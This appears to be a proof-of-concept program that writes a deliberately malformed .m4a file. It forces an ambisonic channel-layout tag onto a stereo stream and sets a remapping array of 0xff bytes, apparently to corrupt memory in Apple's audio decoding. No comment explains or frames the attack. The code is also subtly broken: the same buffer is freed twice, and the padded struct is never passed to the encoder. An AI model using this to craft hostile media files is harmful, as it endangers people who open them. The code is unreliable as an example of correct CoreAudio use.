@import AVFAudio;
@import AudioToolbox;
#include <vector>
#include <random>
#include <stdio.h>
#include <time.h>

struct CodecConfig {
  char padding0[0x78];
  AudioChannelLayout* remappingChannelLayout;
  char padding1[0xe0 - 0x80];
  std::vector<char> mRemappingArray;

  CodecConfig() : remappingChannelLayout(nullptr) {}
  ~CodecConfig() {
    if (remappingChannelLayout) {
      free(remappingChannelLayout);
    }
  }
};

void OverrideApac(CodecConfig* config) {
  if (config->remappingChannelLayout) {
    config->remappingChannelLayout->mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x2;
    fprintf(stderr, "Set channel layout tag to 0x%x\n", config->remappingChannelLayout->mChannelLayoutTag);
  }
  config->mRemappingArray.resize(1024, 0xff);
}

int main() {
  time_t now = time(nullptr);
  fprintf(stderr, "Starting encodeme at %s", ctime(&now));

  double sampleRate = 44100;
  AudioFormatID formatID = kAudioFormatMPEG4AAC;
  uint32_t channelNum = 2; // Stereo
  fprintf(stderr, "Processing sample rate %.0f, format %u\n", sampleRate, formatID);

  AudioStreamBasicDescription inputDescription = {
      .mSampleRate = sampleRate,
      .mFormatID = kAudioFormatLinearPCM,
      .mFormatFlags = kAudioFormatFlagIsFloat | kAudioFormatFlagIsPacked,
      .mBytesPerPacket = 4 * channelNum,
      .mFramesPerPacket = 1,
      .mBytesPerFrame = 4 * channelNum,
      .mChannelsPerFrame = channelNum,
      .mBitsPerChannel = 32,
      .mReserved = 0
  };
  AVAudioFormat* formatIn = [[AVAudioFormat alloc] initWithStreamDescription:&inputDescription];
  if (!formatIn) {
    fprintf(stderr, "Failed to create AVAudioFormat for rate %.0f\n", sampleRate);
    return 1;
  }

  AudioStreamBasicDescription outputDescription = {
      .mSampleRate = sampleRate,
      .mFormatID = formatID,
      .mFormatFlags = 0,
      .mBytesPerPacket = 0,
      .mFramesPerPacket = 1024,
      .mBytesPerFrame = 0,
      .mChannelsPerFrame = channelNum,
      .mBitsPerChannel = 0,
      .mReserved = 0
  };

  AVAudioChannelLayout* channelLayout = [AVAudioChannelLayout layoutWithLayoutTag:kAudioChannelLayoutTag_Stereo];
  if (!channelLayout || !channelLayout.layout) {
    fprintf(stderr, "Failed to create channel layout for rate %.0f\n", sampleRate);
    return 1;
  }

  CodecConfig config;
  size_t layoutSize = sizeof(AudioChannelLayout) + sizeof(AudioChannelDescription) * channelNum;
  AudioChannelLayout* channelLayoutCopy = (AudioChannelLayout*)calloc(1, layoutSize);
  if (!channelLayoutCopy) {
    fprintf(stderr, "Memory allocation failed for channel layout, rate %.0f\n", sampleRate);
    return 1;
  }
  memcpy(channelLayoutCopy, channelLayout.layout, layoutSize);
  config.remappingChannelLayout = channelLayoutCopy;
  fprintf(stderr, "Allocated and copied channel layout for rate %.0f\n", sampleRate);

  OverrideApac(&config);

  NSString* fileName = [NSString stringWithFormat:@"output_%.0f_%u.m4a", sampleRate, formatID];
  NSURL* outUrl = [NSURL fileURLWithPath:fileName];
  fprintf(stderr, "Creating file: %s\n", fileName.UTF8String);

  ExtAudioFileRef audioFile = nullptr;
  OSStatus status = ExtAudioFileCreateWithURL((__bridge CFURLRef)outUrl, kAudioFileM4AType,
                                              &outputDescription, config.remappingChannelLayout,
                                              kAudioFileFlags_EraseFile, &audioFile);
  if (status != noErr) {
    fprintf(stderr, "Error creating file (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
    free(channelLayoutCopy);
    return 1;
  }

  status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientDataFormat,
                                   sizeof(AudioStreamBasicDescription), &inputDescription);
  if (status != noErr) {
    fprintf(stderr, "Error setting client data format (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
    ExtAudioFileDispose(audioFile);
    free(channelLayoutCopy);
    return 1;
  }

  status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientChannelLayout,
                                   layoutSize, formatIn.channelLayout.layout);
  if (status != noErr) {
    fprintf(stderr, "Error setting client channel layout (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
    ExtAudioFileDispose(audioFile);
    free(channelLayoutCopy);
    return 1;
  }

  float* audioBuffer = new float[44100 * channelNum];
  if (!audioBuffer) {
    fprintf(stderr, "Failed to allocate audio buffer for rate %.0f\n", sampleRate);
    ExtAudioFileDispose(audioFile);
    free(channelLayoutCopy);
    return 1;
  }
  std::random_device rd;
  std::mt19937 gen(rd());
  std::uniform_real_distribution<float> dis(-1.0f, 1.0f);
  for (size_t i = 0; i < 44100 * channelNum; ++i) {
    audioBuffer[i] = dis(gen) * 0.5f;
  }
  fprintf(stderr, "Filled audio buffer for rate %.0f\n", sampleRate);

  AudioBufferList audioBufferList = {
      .mNumberBuffers = 1,
      .mBuffers = {{.mNumberChannels = channelNum, .mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float)), .mData = audioBuffer}},
  };
  status = ExtAudioFileWrite(audioFile, 44100, &audioBufferList);
  if (status != noErr) {
    fprintf(stderr, "Error writing audio (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
  }

  status = ExtAudioFileDispose(audioFile);
  if (status != noErr) {
    fprintf(stderr, "Error disposing file (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
  }

  delete[] audioBuffer;
  free(channelLayoutCopy);
  fprintf(stderr, "Completed processing for rate %.0f\n", sampleRate);

  now = time(nullptr);
  fprintf(stderr, "encodeme completed at %s", ctime(&now));
  return 0;
}
